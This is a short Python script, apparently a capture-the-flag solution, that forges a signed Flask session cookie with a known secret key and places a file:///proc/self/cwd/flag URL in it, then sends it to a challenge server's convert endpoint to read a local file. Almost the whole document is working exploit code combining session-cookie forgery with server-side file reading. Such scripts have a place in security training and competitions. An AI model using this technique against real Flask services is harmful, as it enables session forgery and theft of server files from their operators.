#!/usr/bin/env python

# code sniffet from https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

import requests


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)


def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)


# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)


sk = 'v3ry_v3ry_s3cr37_k3y'

session_dict = {
    u'url': u'file:///proc/self/cwd/flag'
}
session = encodeFlaskCookie(sk, session_dict)

print requests.get('http://imager.eatpwnnosleep.com:82/convert', cookies={
    'session': session
}).content
